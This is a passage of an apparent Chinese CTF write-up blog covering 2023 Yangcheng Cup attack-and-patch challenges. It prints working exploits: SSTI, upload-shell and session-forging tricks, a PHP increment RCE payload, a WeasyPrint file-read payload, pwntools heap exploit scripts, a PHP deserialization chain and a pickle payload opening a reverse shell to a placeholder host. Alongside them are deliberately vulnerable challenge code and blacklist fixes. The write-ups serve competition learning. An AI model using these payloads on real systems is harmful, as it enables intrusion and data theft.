wp","url":"/posts/cec9c888/","content":"\nBreak和Fix阶段都是小组第一\n\n比赛的时候没写wp，**赛后复现**\n\n# web-ezSSTI\n\n## Break\n\n[焚靖](https://github.com/Marven11/Fenjing)一把梭\n`python -m fenjing crack --url \"http://192.168.100.100:10007/\" --method GET --inputs name  --environment jinja`\n\n![](/img/wp/2023/2023ycb-final-1.png)\n\n\n## Fix\n\napp.py\n\n```python\nfrom flask import Flask,request\nfrom jinja2 import Template\nimport re\n\napp = Flask(__name__)\n\n@app.route(\"/\")\ndef index():\n    name = request.args.get('name','CTFer<!--?name=CTFer')\n    if not re.findall(r\"'|_|\\\\x|\\\\u|{{|\\+|attr|\\.| |class|init|globals|popen|system|env|exec|shell_exec|flag|passthru|proc_popen\",name):\n        t = Template(\"hello \"+name)\n        return t.render()\n    else:\n        t = Template(\"Hacker!!!\")\n        return t.render()\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\",port=5000)\n```\n\n直接在正则中添加`\"`，`()`，`[]`，`\\`等符号，注意不要过滤太严格，否则过不了check\n\n\n\n# web-easyupload\n\n## Break\n\nF12可以看到账号密码，`admin/hgrehhterh`，跳转到`dadaadwdwfegrgewg.php`，一个文件上传点\n\n上传`.htaccess`后传图片拿shell\n\n`AddType application/x-httpd-php .png`\n\n\n![](/img/wp/2023/2023ycb-final-2.png)\n\n![](/img/wp/2023/2023ycb-final-3.png)\n\n## Fix\n\ndadaadwdwfegrgewg.php\n\n```php\n<?php\nheader(\"Content-type: text/html;charset=utf-8\");\nerror_reporting(1);\n\ndefine(\"WWW_ROOT\",$_SERVER['DOCUMENT_ROOT']);\ndefine(\"APP_ROOT\",str_replace('\\\\','/',dirname(__FILE__)));\ndefine(\"APP_URL_ROOT\",str_replace(WWW_ROOT,\"\",APP_ROOT));\ndefine(\"UPLOAD_PATH\", \"upload\");\n?>\n<?php\n\n\n\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //收尾去空\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件不允许上传!';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n?>\n\n<div id=\"upload_panel\">\n            <form enctype=\"multipart/form-data\" method=\"post\" onsubmit=\"return checkFile()\">\n                <p>请选择要上传的图片：<p>\n                <input class=\"input_file\" type=\"file\" name=\"upload_file\"/>\n                <input class=\"button\" type=\"submit\" name=\"submit\" value=\"上传\"/>\n            </form>\n            <div id=\"msg\">\n                <?php \n                    if($msg != null){\n                        echo \"提示：\".$msg;\n                    }\n                ?>\n            </div>\n            <div id=\"img\">\n                <?php\n                    if($is_upload){\n                        echo '<img src=\"'.$img_path.'\" width=\"250px\" />';\n                    }\n                ?>\n            </div>\n</div>\n```\n\n黑名单中加个`.htaccess`可以直接过check\n\n```php\n$deny_ext = array(\".php\",\".php5\",\".php4\",\".htaccess\",\".php3\",\".php2\",\".php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".ini\");\n```\n\n# web-BabyMemo\n\n## Break\n\n扫目录下载`www.zip`\n\nindex.php部分源码\n\n```php\n<?php\nob_start();\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    if (isset($_POST['username']) && !empty($_POST['username'])) {\n        $_SESSION['username'] = $_POST['username'];\n\n        if (!isset($_SESSION['memos'])) {\n            $_SESSION['memos'] = [];\n        }\n\n        echo '<script>window.location.href=\"memo.php\";</script>';\n        exit;\n    } else {\n        echo '<script>window.location.href=\"index.php?error=1\";</script>';\n        exit;\n    }\n}\nob_end_flush();\n?>\n```\n\nmemo.php\n\n```php\n<?php\nsession_start();\n\nif (!isset($_SESSION['username'])) {\n    header('Location: index.php');\n    exit();\n}\n\nif (isset($_POST['memo']) && !empty($_POST['memo'])) {\n    $_SESSION['memos'][] = $_POST['memo'];\n}\n\nif (isset($_POST['backup'])) {\n    $backupMemos = implode(PHP_EOL, $_SESSION['memos']);\n\n    $random = bin2hex(random_bytes(8));\n    $filename = '/tmp/' . $_SESSION['username'] . '_' . $random;\n\n    // Handle compression method and file extension\n    $compressionMethod = $_POST['compression'] ?? 'none';\n    switch ($compressionMethod) {\n        case 'gzip':\n            $compressedData = gzencode($backupMemos);\n            $filename .= '.gz';\n            $mimeType = 'application/gzip';\n            break;\n        case 'bzip2':\n            $compressedData = bzcompress($backupMemos);\n            $filename .= '.bz2';\n            $mimeType = 'application/x-bzip2';\n            break;\n        case 'zip':\n            $zip = new ZipArchive();\n            $zipFilename = $filename . '.zip';\n            if ($zip->open($zipFilename, ZipArchive::CREATE) === true) {\n                $zip->addFromString($filename, $backupMemos);\n                $zip->close();\n            }\n            $filename = $zipFilename;\n            $mimeType = 'application/zip';\n            break;\n        case 'none':\n            $compressedData = $backupMemos;\n            $filename .= '.txt';\n            $mimeType = 'text/plain';\n            break;\n        default:\n            // I don't know what extension this is, but I'll still give you the file. Don't play any tricks, okay~\n            $compressedData = str_rot13($backupMemos);\n            $filename .= '.' . $compressionMethod;\n            $mimeType = 'text/plain';\n            while (strpos($filename, '../') !== false) {\n                $filename = str_replace('../', '', $filename);\n            }\n            break;\n    }\n\n    file_put_contents($filename, $compressedData);\n    // Send headers and output file content\n    header('Content-Description: File Transfer');\n    header('Content-Type: ' . $mimeType);\n    header('Content-Disposition: attachment; filename=\"' . basename($filename) . '\"');\n    header('Content-Length: ' . filesize($filename));\n    readfile($filename);\n}\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Memo</title>\n    <style>\n        body {\n            background-color: beige;\n            font-family: Arial, sans-serif;\n        }\n\n        h1,\n        h2 {\n            color: darkslategray;\n            margin-top: 30px;\n            margin-bottom: 10px;\n        }\n\n        form {\n            margin: 30px auto;\n            width: 80%;\n            padding: 20px;\n            background-color: white;\n            border-radius: 10px;\n            box-shadow: 0px 0px 10px 2px rgba(0, 0, 0, 0.3);\n        }\n\n        label {\n            display: block;\n            margin-bottom: 10px;\n        }\n\n        input[type=\"text\"],\n        select {\n            width: 100%;\n            padding: 10px;\n            border-radius: 5px;\n            border: none;\n            margin-bottom: 20px;\n        }\n\n        button[type=\"submit\"] {\n            background-color: darkslategray;\n            color: white;\n            border: none;\n            padding: 10px 20px;\n            border-radius: 5px;\n            cursor: pointer;\n        }\n    </style>\n</head>\n\n<body>\n    <h1>Welcome, <?php echo htmlspecialchars($_SESSION['username']); ?></h1>\n    <form action=\"memo.php\" method=\"post\">\n        <label for=\"memo\">New Memo:</label>\n        <input type=\"text\" name=\"memo\" id=\"memo\" required>\n        <button type=\"submit\">Add Memo</button>\n    </form>\n    <h2>Here 1s Your Memos:</h2>\n    <ul>\n        <?php foreach ($_SESSION['memos'] as $memo) : ?>\n            <li><?php echo htmlspecialchars($memo); ?></li>\n        <?php endforeach; ?>\n        <?php if (isset($_SESSION['admin']) && $_SESSION['admin'] === true) : ?>\n            <li><?php system(\"cat /flag\"); ?></li> <!-- Only admin can get flag -->\n        <?php endif ?>\n    </ul>\n    <form action=\"memo.php\" method=\"post\">\n        <label for=\"compression\">Compression method:</label>\n        <select name=\"compression\" id=\"compression\">\n            <option value=\"none\">None</option>\n            <option value=\"gzip\">GZIP</option>\n            <option value=\"bzip2\">BZIP2</option>\n            <option value=\"zip\">ZIP</option>\n        </select>\n        <button type=\"submit\" name=\"backup\" value=\"1\">Export Backup</button>\n    </form>\n</body>\n\n</html>\n```\n\n\n1：首先很明显，当`$_SESSION['admin'] === true`时就给flag，所以我们需要伪造session\n\n```php\n<?php if (isset($_SESSION['admin']) && $_SESSION['admin'] === true) : ?>\n            <li><?php system(\"cat /flag\"); ?></li> <!-- Only admin can get flag -->\n<?php endif ?>\n```\n\n2：网页有个下载功能点，可以自定义后缀\n\n但是过滤了`../`\n\n```php\ndefault:\n    // I don't know what extension this is, but I'll still give you the file. Don't plaany tricks, okay~\n    $compressedData = str_rot13($backupMemos);\n    $filename .= '.' . $compressionMethod;\n    $mimeType = 'text/plain';\n    while (strpos($filename, '../') !== false) {\n        $filename = str_replace('../', '', $filename);\n    }\n    break;\n```\n\n3：接着`file_put_contents`写到`/tmp`目录下，格式为`用户名_随机数.文件后缀`，其中用户名和文件后缀是可控的\n\n\n```php\n$random = bin2hex(random_bytes(8));\n$filename = '/tmp/' . $_SESSION['username'] . '_' . $random;\n$compressionMethod = $_POST['compression'] ?? 'none';\n$filename .= '.' . $compressionMethod;\n\nfile_put_contents($filename, $compressedData);\n// Send headers and output file content\nheader('Content-Description: File Transfer');\nheader('Content-Type: ' . $mimeType);\nheader('Content-Disposition: attachment; filename=\"' . basename($filename) . '\"');\nheader('Content-Length: ' . filesize($filename));\nreadfile($filename);\n```\n\n\n根据第二点和第三点可以得知，当传`compression`值为`./`时，与前面的`.`组合变成`../`，然后被替换成空，就可以修改文件格式为`用户名_随机数`\n\n![](/img/wp/2023/2023ycb-final-4.png)\n\n\n而在php中，session文件默认位置是`/tmp/sess_PHPSESSID`，那么我们就可以把伪造的内容写入文件，然后设置`PHPSESSID`去访问\n\n本题用的解析引擎是默认的`php`，格式为`键名 + 竖线 + 经过serialize()函数序列化处理的值`，例如`username|s:1:\"q\";memos|a:1:{i:0;s:1:\"a\";}`\n\n\n我们可以伪造一个`admin|b:1;username|s:5:\"admin\";`，注意代码中还有一层`str_rot13`，变成`nqzva|o:1;hfreanzr|f:5:\"nqzva\";`\n\n然后用`sess`登录后写入进memos\n\n![](/img/wp/2023/2023ycb-final-5.png)\n\n设置后缀为`./`，写入到`sess_46364caa4533f999`\n\n![](/img/wp/2023/2023ycb-final-6.png)\n\n设置`PHPSESSID`为`46364caa4533f999`访问拿到flag\n\n![](/img/wp/2023/2023ycb-final-7.png)\n\n## Fix\n\n我的修法应该是非预期了\n\n直接修改读flag的命令就过了\n\n```php\n<?php if (isset($_SESSION['admin']) && $_SESSION['admin'] === true) : ?>\n            <li><?php system(\"cat flag\"); ?></li> <!-- Only admin can get flag -->\n<?php endif ?>\n```\n\n正常可以设置一个判断，使用户不能等于`sess`或者在后缀处加个白名单等等\n\n\n# web-fuzee_rce\n\n## Break\n\n弱口令`admin/admin123`直接登录后跳转到`goods.php`，然后就是一片空白，当时比赛时尝试了几个常见的参数，都没试出来就放弃了，在Fix阶段看到源码后没想到参数是`w1key`\n\n传参后拿到源码\n```php\n<?php\nerror_reporting(0);\ninclude (\"check.php\");\nif (isset($_GET['w1key'])) {\n    highlight_file(__FILE__);\n    $w1key = $_GET['w1key'];\n    if (is_numeric($w1key) && intval($w1key) == $w1key && strlen($w1key) <= 3 && $w1key > 999999999) {\n        echo \"good\";\n    }\n    else {\n        die(\"Please input a valid number!\");\n    }\n}\nif (isset($_POST['w1key'])) {\n    $w1key = $_POST['w1key'];\n    strCheck($w1key);\n    eval($w1key);\n}\n?>\nPlease input a valid number!\n```\n\n第一个if没啥用，要过的话用科学计数法就行\n\n第二个if存在一个代码执行，但是有个waf，会过滤一些字符，同时存在长度限制\n\n先fuzz看下能用的符号\n\n![](/img/wp/2023/2023ycb-final-8.png)\n\n\n可以用自增rce\n\n`w1key=$%ff=_(%ff/%ff)[%ff];$_=%2b%2b$%ff;$_=_.%2b%2b$%ff.$_;$%ff%2b%2b;$%ff%2b%2b;$_.=%2b%2b$%ff.%2b%2b$%ff;$$_[_]($$_[%ff]);&_=system&%ff=ls`\n\n![](/img/wp/2023/2023ycb-final-9.png)\n\n\n\n## Fix\n\n比赛时修的代码：\n\n```php\n<?php\nfunction strCheck($w1key)\n{\n    if (is_string($w1key) && strlen($w1key) <= 83) {\n        if (!preg_match(\"/[1-9a-zA-Z!,()\\[\\]\\/%+@'#^&%*:\\.{}\\-<\\?>\\\"|`~\\\\\\\\]/\",$w1key)){\n            return $w1key;\n        }else{\n            die(\"黑客是吧，我看你怎么黑！\");\n        }\n    }\n    else{\n        die(\"太长了\");\n      }\n    }\n```\n\n\n\n# web-Oh! My PDF\n\n## Break\n\n>忘记当时有没有给源码了，就先当没有源码来分析吧\n\n有个注册和登录功能，主页面的功能是访问提供的url并转成pdf然后下载\n\n\n随意注册一个账号登录后提示需要是admin权限才能操作\n\n![](/img/wp/2023/2023ycb-final-10.png)\n\n\n抓包发现使用了jwt，尝试空密钥直接修改isadmin的值后成功绕过\n\n![](/img/wp/2023/2023ycb-final-11.png)\n\n\n然后是主功能点，试了下不能使用类似`file://`的协议，只能使用`http://`\n在vps上开个监听，访问后可以看到`WeasyPrint`库的特征\n\n![](/img/wp/2023/2023ycb-final-12.png)\n\n\n这个爬虫虽然不会渲染js，但是却可以解析`<link attachment=xxx>`，因此我们可以在vps上构造payload： `<link rel=\"attachment\" href=\"file:///etc/passwd\">`来实现任意文件读取\n\n例如\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n</head>\n<body>\n<link rel=\"attachment\" href=\"file:///flag\">\n</body>\n</html>\n```\n\n然后去访问这个页面，返回一个pdf，用binwalk提取就能看到文件内容了\n\n![](/img/wp/2023/2023ycb-final-13.png)\n\n\n## Fix\n\n\n\n```python\nfrom flask import Flask, request, jsonify, make_response, render_template, flash, redirect, url_for\nfrom flask_sqlalchemy import SQLAlchemy\nimport jwt\nimport re\nfrom urllib.parse import urlsplit\nfrom flask_weasyprint import HTML, render_pdf\nfrom werkzeug.security import generate_password_hash, check_password_hash\nimport os\n\napp = Flask(__name__)\n\napp.config['SECRET_KEY'] = os.urandom(10)\napp.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'\n\ndb = SQLAlchemy(app)\n\nURL_REGEX = re.compile(\n    r'http(s)?://'  # http or https\n    r'(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+'\n)\n\n\nclass User(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    username = db.Column(db.String(80), unique=True, nullable=False)\n    password = db.Column(db.String(80), nullable=False)\n    is_admin = db.Column(db.Boolean, nullable=False, default=False)\n\ndef create_database(app):\n    with app.app_context():\n        db.create_all()\n\ndef is_valid_url(url):\n    if not URL_REGEX.match(url):\n        return False\n    return True\n\n@app.route('/register', methods=['POST','GET'])\ndef register():\n    if request.method == 'POST':\n        try:\n            data = request.form\n            hashed_password = generate_password_hash(data['password'])\n            new_user = User(username=data['username'], password=hashed_password, is_admin=False)\n            db.session.add(new_user)\n            db.session.commit()\n\n            return render_template('register.html',message='User registered successfully')\n        except:\n            return render_template('register.html',message='Register Error!'),500\n    else:\n        return render_template('register.html',message='please register first!')\n\n\n@app.route('/login', methods=['POST','GET'])\ndef login():\n    if request.method == 'POST':\n        data = request.form\n        user = User.query.filter_by(username=data['username']).first()\n        if user and check_password_hash(user.password, data['password']):\n            access_token = jwt.encode(\n                {'username': user.username, 'isadmin':False}, app.config['SECRET_KEY'], algorithm=\"HS256\")\n            res = make_response(redirect(url_for('ohmypdf')))\n            res.set_cookie('access_token',access_token)\n            return res, 200\n        else:\n            return render_template('login.html',message='Invalid username or password'), 500\n    else:\n        return render_template('login.html'), 200\n\n\n\n@app.route('/', methods=['GET', 'POST'])\ndef ohmypdf():\n    access_token = request.cookies.get('access_token')\n    if not access_token:\n        return redirect(url_for(\"login\"))\n\n    try:\n        decoded_token = jwt.decode(\n            access_token, app.config['SECRET_KEY'], algorithms=[\"HS256\"],options={\"verify_signature\": False})\n        isadmin = decoded_token['isadmin']\n    except:\n        return render_template('login.html',message='Invalid access token')\n\n    if not isadmin:\n        return render_template('index.html',message='You do not have permission to access this resource. Where is the admin?!'), 403\n\n    if request.method == 'POST':\n        url = request.form.get('url')\n        if is_valid_url(url):\n            try:\n                html = HTML(url=url)\n                pdf = html.write_pdf()\n                response = make_response(pdf)\n                response.headers['Content-Type'] = 'application/pdf'\n                response.headers['Content-Disposition'] = 'attachment; filename=output.pdf'\n                return response\n            except Exception as e:\n                return f'Error generating PDF', 500\n        else:\n            return f'Invalid URL!'\n    else:\n        return render_template(\"index.html\"), 200\n\n\nif __name__ == '__main__':\n    create_database(app)\n    app.run(host='0.0.0.0', port=8080)\n```\n\n\n看下代码中关于jwt的部分，可以从这部分入手\n\n```python\napp.config['SECRET_KEY'] = os.urandom(10)\n\naccess_token = jwt.encode(\n                {'username': user.username, 'isadmin':False}, app.config['SECRET_KEY'], algorithm=\"HS256\")\n\n\ndecoded_token = jwt.decode(\n            access_token, app.config['SECRET_KEY'], algorithms=[\"HS256\"],options={\"verify_signature\": False})\nisadmin = decoded_token['isadmin']\n```\n\n`{\"verify_signature\": False}` 修改成 `{\"verify_signature\": True}`\n\n<hr>\n\n[参考文章1](https://blog.csdn.net/Jayjay___/article/details/132915944)\n[参考文章2](https://blog.csdn.net/solitudi/article/details/109231974)\n\n\n# pwn-arrary_index_bank\n\n## Break\n\n整数溢出\n\n```python\nfrom pwn import *\n\ndef show(ind):\n    p.sendlineafter('>','1')\n    p.sendlineafter('account?',str(ind))\n    p.readuntil('=')\n    d=int(p.readline())\n    return d\n\n\ndef edit(ind,data):\n    p.sendlineafter('>','2')\n    p.sendlineafter('account?',str(ind))\n    p.sendlineafter('much?',str(data))\n\n\ne=ELF(\"./pwn\")\np=process(\"./pwn\")\n\nd=show(-1)\nprint(hex(d))\nwin=d-0x1426+0x1315\ne.address=d-0x1426\n\nd=show(-2)\nprint(hex(d))\nstack=d-0x30\n\nyou=e.address+0x4010\nind=(you-stack)//8\n#print(show(ind))\nedit(ind,0x20)\nprint(edit(7,win))\n\n\np.interactive()\n```\n\n## Fix\n\n修改`jle`指令变成`jbe`\n\n>JBE用于无符号数比较，JLE用于有符号数比较\n\n![](/img/wp/2023/2023ycb-final-14.png)\n\n\n![](/img/wp/2023/2023ycb-final-15.png)\n\n\n\n\n# pwn-easy_force\n\n## Break\n\nhouse_of_force\n\n```python\nfrom pwn import *\nimport time\ncontext.log_level='debug'\ndef add(ind,size,data='\\n',end=False):\n    p.sendlineafter('away','1')\n    p.sendlineafter('index?',str(ind))\n    p.sendlineafter('want?',str(size))\n    p.sendafter('write?',data)\n    if end==False:\n        p.readuntil('balckbroad on ')\n        d=int(p.readuntil(' '),16)\n        return d\n\ngadget=0x6a2226\nputs=0x6f6a0\ndef pwn(p):\n    #gadget=int(input(\"asdfasdf:\"),16)\n    chunk1=add(0x0,0x18,b'\\x00'*0x18+b'\\xff'*8)\n    top_chunk=chunk1+0x20\n    to=0x602000\n    chunk2=add(1,(to-top_chunk))\n    chunk3=add(2,0x58,b'a'*0x18+gadget.to_bytes(3,'little'),True)\n    print(hex(chunk2))\n    p.sendline(\"asdfasdf\")\n    d=p.readuntil('asdfasdf',timeout=0.01)\n    if b'asdf' not in d:\n        return\n    p.interactive()\n    pass\n\nwhile True:\n    try:\n        p=process('./pwn')\n     #   gdb.attach(p)\n        pwn(p)\n    except Exception as e:\n        print(e)\n        pass\n    p.close()\n\n\n    time.sleep(0.01)\n```\n\n\n## Fix\n\n修改写入数据长度  `0x30-->0x10`\n\n![](/img/wp/2023/2023ycb-final-16.png)\n\n\n# pwn-Printf but not fmtstr\n\n## Break\n\n```python\nfrom pwn import *\ncontext.arch='amd64'\ndef add(ind,size):\n    p.sendlineafter(b'>',b'1')\n    p.sendlineafter(b'Index:',str(ind))\n    p.sendlineafter(b'Size:',str(size))\n\ndef free(ind):\n    p.sendlineafter(b'>',b'2')\n    p.sendlineafter(b'Index: ',str(ind))\n\ndef edit(ind,data):\n    p.sendlineafter(b'>',b'3')\n    p.sendlineafter(b'Index: ',str(ind))\n    p.sendafter(b'Content: ',data)\n\ndef show(ind):\n    p.sendlineafter(b'>',b'4')\n    p.sendlineafter(b'Index: ',str(ind))\n\nlibc=ELF(\"./pwn2lib\")\np=process('./pwn2')\ngdb.attach(p)\nadd(0,0x508)\nadd(1,0x518)\nadd(4,0x518)\nadd(2,0x518)\nadd(3,0x518)\n\n# one\nfree(2)\nshow(2)\np.readuntil(b'Content: ')\nlbin=u64(p.readuntil('\\n',drop=1).ljust(8,b'\\x00'))\nlibc.address=lbin-0x40-62*0x10-0x60-0x10-0x1f6830-0x430\nsuccess(f\"{libc.address=:x}\")\n\nadd(4,0x600)\nedit(2,p64(lbin)*2+p64(0x404140)*2)\nfree(0)\nadd(5,0x600)\n\nshow(2)\np.readuntil(b'Content: ')\nchunk0=u64(p.readuntil('\\n',drop=1).ljust(8,b'\\x00'))\nsuccess(f\"{chunk0=:x}\")\n\nfc=0x4040e0\nadd(6,0x508)\n\npayload=flat({0:[0,0x501,fc-0x18,fc-0x10],0x500:[0x500,0x520]},filler=b'\\x00')\nedit(0,payload)\nfree(1)\nedit(0,p64(0x4040e0)*16)\nedit(0,p64(0x404000))\nedit(0,p64(0x4011d6))\nfree(1)\n\n\n\np.interactive()\n```\n\n## Fix\n\n修改plt表中的free函数项，使其在执行时跳转到自己构造的指令位置，用于执行free函数并将指针数组中被释放的chunk的地址设置为NULL\n\n![](/img/wp/2023/2023ycb-final-17.png)","tags":["wp","awdp","2023竞赛","羊城杯"],"categories":["wp"]},{"title":"2023羊城杯初赛misc&web wp","url":"/posts/58b7474e/","content":"\n# web\n\n## D0n't pl4y g4m3!!!\n\n访问`/p0p.php`，返回一个`hint.zip`\n\n\n```\nÖ_0 0vO Ow0 0w0 Ö_0 Ö_O Ö.O o_o 0.O OvO o.0 owo o.Ö Ö.Ö Ovo 0_Ö Ö_o owO O.0 owo Ö_o owO O.0 owo Ö_0 0wÖ O.0 0w0 Ö_0 OwO ov0 owo o_O O.Ö Övo\n```\n\n[尊嘟假嘟翻译器O.o](https://zdjd.vercel.app/)得到`flag在/tmp/catcatf1ag.txt`\n\n利用  [PHP<=7.4.21 Development Server源码泄露漏洞](http://www.gem-love.com/2023/02/04/PHP-7-4-21-Development-Server%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/)  得到源码\n\n![](/img/wp/2023/2023ycb-1.png)\n\n```php\n<?php\nheader(\"HTTP/1.1 302 found\");\nheader(\"Location:https://passer-by.com/pacman/\");\n\nclass Pro{\n    private $exp;\n    private $rce2;\n\n    public function __get($name)\n    {\n        return $this->$rce2=$this->exp[$rce2];\n    }\n    public  function __toString()\n    {\n            call_user_func('system', \"cat /flag\");\n     }\n}\n\nclass Yang\n{\n    public function __call($name, $ary)\n    {\n        if ($this->key === true || $this->finish1->name) {\n            if ($this->finish->finish) {\n                call_user_func($this->now[$name], $ary[0]);\n            }\n        }\n    }\n    public function ycb()\n    {\n        $this->now = 0;\n        return $this->finish->finish;\n    }\n    public function __wakeup()\n    {\n        $this->key = True;\n    }\n}\nclass Cheng\n{\n    private $finish;\n    public $name;\n    public function __get($value)\n    {\n\n        return $this->$value = $this->name[$value];\n    }\n}\nclass Bei\n{\n    public function __destruct()\n    {\n        if ($this->CTF->ycb()) {\n            $this->fine->YCB1($this->rce, $this->rce1);\n        }\n    }\n    public function __wakeup()\n    {\n        $this->key = false;\n    }\n}\n\nfunction prohib($a){\n    $filter = \"/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i\";\n    return preg_replace($filter,'',$a);\n}\n\n$a = $_POST[\"CTF\"];\nif (isset($a)){\n  unserialize(prohib($a));\n}\n?>\n```\n\n一个php反序列化，从hint中得知flag位置不在根目录，所以`Pro`类可以舍弃\n发现敏感函数`call_user_func`，所以最终应该要调用`__call`，而在`Bei`中`__destruct()`存在函数调用，poc如下\n\n\n```php\n$a = new Bei();\n\n$a -> CTF = new Yang();\n$a -> CTF -> finish = new Cheng();\n$a -> CTF -> finish -> name = array(\"finish\"=>true);\n\n\n$a -> fine = new Yang();\n$a -> rce = \"/tmp/catcatf1ag.txt\";\n$a -> fine -> finish = new Cheng();\n$a -> fine -> finish -> name = array(\"finish\"=>true);\n$a -> fine -> now = array(\"YCB1\"=>\"highlight_file\");\n\necho urlencode(serialize($a));\n```\n\n`O%3A3%3A%22Bei%22%3A3%3A%7Bs%3A3%3A%22CTF%22%3BO%3A4%3A%22Yang%22%3A1%3A%7Bs%3A6%3A%22finish%22%3BO%3A5%3A%22Cheng%22%3A2%3A%7Bs%3A13%3A%22%00Cheng%00finish%22%3BN%3Bs%3A4%3A%22name%22%3Ba%3A1%3A%7Bs%3A6%3A%22finish%22%3Bb%3A1%3B%7D%7D%7Ds%3A4%3A%22fine%22%3BO%3A4%3A%22Yang%22%3A2%3A%7Bs%3A6%3A%22finish%22%3BO%3A5%3A%22Cheng%22%3A2%3A%7Bs%3A13%3A%22%00Cheng%00finish%22%3BN%3Bs%3A4%3A%22name%22%3Ba%3A1%3A%7Bs%3A6%3A%22finish%22%3Bb%3A1%3B%7D%7Ds%3A3%3A%22now%22%3Ba%3A1%3A%7Bs%3A4%3A%22YCB1%22%3Bs%3A14%3A%22highlight_file%22%3B%7D%7Ds%3A3%3A%22rce%22%3Bs%3A19%3A%22%2Ftmp%2Fcatcatf1ag.txt%22%3B%7D`\n\n最后那个过滤用`highlight_file`函数或者双写都可以绕过\n\n![](/img/wp/2023/2023ycb-2.png)\n\n\n## Serpent\n\nwww.zip下载源码\n\n```python\nfrom flask import Flask, session\nfrom secret import secret\n\n@app.route('/verification')\ndef verification():\n    try:\n        attribute = session.get('Attribute')\n        if not isinstance(attribute, dict):\n            raise Exception\n    except Exception:\n        return 'Hacker!!!'\n    if attribute.get('name') == 'admin':\n        if attribute.get('admin') == 1:\n            return secret\n        else:\n            return \"Don't play tricks on me\"\n    else:\n        return \"You are a perfect stranger to me\"\n\nif __name__ == '__main__':\n    app.run('0.0.0.0', port=80)\n```\n\n访问`/verification`，进行session伪造，得到`Hello admin, welcome to /ppppppppppick1e`\n\n![](/img/wp/2023/2023ycb-3.png)\n\n\n访问`/ppppppppppick1e`，得到`Hint: Source in /src0de`\n\n```python\n@app.route('/src0de')\ndef src0de():\n    f = open(__file__, 'r')\n    rsp = f.read()\n    f.close()\n    return rsp[rsp.index(\"@app.route('/src0de')\"):]\n\n@app.route('/ppppppppppick1e')\ndef ppppppppppick1e():\n    try:\n        username = \"admin\"\n        rsp = make_response(\"Hello, %s \" % username)\n        rsp.headers['hint'] = \"Source in /src0de\"\n        pick1e = request.cookies.get('pick1e')\n        if pick1e is not None:\n            pick1e = base64.b64decode(pick1e)\n        else:\n            return rsp\n        if check(pick1e):\n            pick1e = pickle.loads(pick1e)\n            return \"Go for it!!!\"\n        else:\n            return \"No Way!!!\"\n    except Exception as e:\n        error_message = str(e)\n        return error_message\n\n    return rsp\n\nclass GWHT():\n    def __init__(self):\n        pass\n\nif __name__ == '__main__':\n    app.run('0.0.0.0', port=80)\n```\n\npickle反序列化rce\n\n反弹shell\n\n```python\nimport pickle\nimport base64\n\n\npayload= b'''(S'python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"ip\",port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")''\nios\nsystem\n.'''\n\nprint(base64.b64encode(payload))\n```\n\n发现没有权限\n\n![](/img/wp/2023/2023ycb-4.png)\n\n查找有权限的命令\n\n`find /bin/ -perm 777`或者`find / -perm -u=s -type f 2>/dev/null`\n\n发现python3有权限，使用python3读flag\n`python3 -c 'print(open(\"/flag\").read())'`\n\n![](/img/wp/2023/2023ycb-5.png)\n\n\n## ArkNights\n\n```python\nimport uuid\nfrom flask import *\nfrom werkzeug.utils import *\napp = Flask(__name__)\napp.config['SECRET_KEY'] =str(uuid.uuid4()).replace(\"-\",\"*\")+\"Boogipopisweak\"\n@app.route('/')\ndef index():\n    name=request.args.get(\"name\",\"name\")\n    m1sery=[request.args.get(\"m1sery\",\"Doctor.Boogipop\")]\n    if(session.get(\"name\")==\"Dr.Boog1pop\"):\n        blacklist=re.findall(\"/ba|sh|\\\\\\\\|\\[|]|#|system|'|\\\"/\", name, 